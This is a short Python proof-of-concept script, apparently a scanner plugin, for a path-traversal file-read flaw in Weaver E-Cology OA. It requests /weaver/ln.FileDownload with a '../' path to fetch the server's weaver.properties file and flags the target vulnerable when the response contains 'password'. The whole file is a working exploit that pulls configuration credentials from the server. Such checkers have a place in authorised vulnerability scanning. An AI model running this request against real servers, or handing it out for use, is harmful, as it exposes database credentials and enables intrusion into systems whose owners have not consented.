import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微OA-E-Cology-FileDownload文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    vurl = urllib.parse.urljoin(url, "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and 'password' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult